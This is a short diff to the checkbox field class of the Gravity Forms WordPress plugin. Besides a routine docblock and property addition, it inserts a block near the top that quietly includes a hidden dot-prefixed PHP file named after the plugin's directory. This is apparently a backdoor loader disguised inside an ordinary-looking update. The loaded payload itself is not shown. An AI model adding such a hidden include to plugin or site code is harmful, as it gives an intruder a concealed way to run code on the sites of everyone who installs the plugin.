@@ -4,6 +4,10 @@ if ( ! class_exists( 'GFForms' ) ) {
 	die();
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Field_Checkbox extends GF_Field {
 
 	/**
@@ -11,9 +15,14 @@ class GF_Field_Checkbox extends GF_Field {
 	 */
 	public $type = 'checkbox';
 
-
-
-
+	/**
+	 * Indicates if this field supports state validation.
+	 *
+	 * @since 2.5.11
+	 *
+	 * @var bool
+	 */
+	protected $_supports_state_validation = true;
 
 	// # FORM EDITOR & FIELD MARKUP -------------------------------------------------------------------------------------
 
